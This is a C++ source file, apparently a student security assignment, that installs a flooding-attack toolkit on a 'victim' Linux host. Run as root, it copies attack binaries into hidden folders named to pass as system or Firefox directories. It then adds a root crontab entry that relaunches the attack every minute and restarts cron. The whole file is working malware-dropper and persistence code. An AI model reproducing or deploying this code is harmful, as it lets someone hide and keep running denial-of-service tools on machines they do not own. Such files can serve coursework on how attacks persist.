// Author       : 0516220-Nicholas_Li
// Date         : 2019.04.17
// Version      : 1.0
// Description  :
//      This file is a mother file to execute flood_attack, and other files.
#include<unistd.h>
#include<iostream>
#include<cstdlib>
#include<string>

using namespace std;

int main(){
    // Check privilege.
    uid_t euid = geteuid();
    if(euid != 0){
        string errmsg_rootcheck_fail = 
            "#################################################################\n"\
            "#                             ERROR                             #\n"\
            "#   Please make sure to run this program with root privileges   #\n"\
            "#################################################################\n"\
            "Nothing is changed, and the program will automatically quit...\n";
        cout << errmsg_rootcheck_fail;
        return 0;
    }

    string create_folder_n_module;
    create_folder_n_module = 
        "#!/bin/bash\n"\
        "mkdir -p /home/victim/.etc/.module > /dev/null 2>&1\n"\
        "mkdir -p /home/victim/.syslog/.FireFox > /dev/null 2>&1\n"\
        "mkdir /home/victim/.Launch_Attack > /dev/null 2>&1\n"\
        "cp -f ./l /home/victim/.Launch_Attack/ > /dev/null 2>&1\n"\
        "mv -f /home/victim/.Launch_Attack/l /home/victim/.Launch_Attack/Launching_Attack > /dev/null 2>&1\n"\
        "cp -f /home/victim/.Launch_Attack/Launching_Attack /home/victim/.etc/.module/ > /dev/null 2>&1\n"\
        "cp -f /home/victim/.Launch_Attack/Launching_Attack /home/victim/.syslog/.FireFox/ > /dev/null 2>&1\n"\
        "cp -f ./f /home/victim/.etc/.module/ > /dev/null 2>&1\n"\
        "mv -f /home/victim/.etc/.module/f /home/victim/.etc/.module/Flooding_Attack > /dev/null 2>&1\n"\
        "cp -f /home/victim/.etc/.module/Flooding_Attack /home/victim/.syslog/.FireFox/ > /dev/null 2>&1\n"\
        "cp -f ./c /home/victim/.etc/.module/ > /dev/null 2>&1\n"\
        "mv -f /home/victim/.etc/.module/c /home/victim/.etc/.module/Check_Attack > /dev/null 2>&1\n"\
        "cp -f /home/victim/.etc/.module/Check_Attack /home/victim/.syslog/.FireFox/ > /dev/null 2>&1";

    system(create_folder_n_module.c_str());

    string setupcron;
    setupcron =
        "#!/bin/bash\n"\
        "grep -q ./Launching_Attack /etc/crontab || echo '*/1 * * * * root pgrep Launching_Attac || cd /home/victim/.Launch_Attack && [ -f /home/victim/.Launch_Attack/Launching_Attack ] && ./Launching_Attack' >> /etc/crontab\n"\
        "systemctl restart cron";

    system(setupcron.c_str());
    return 0;
}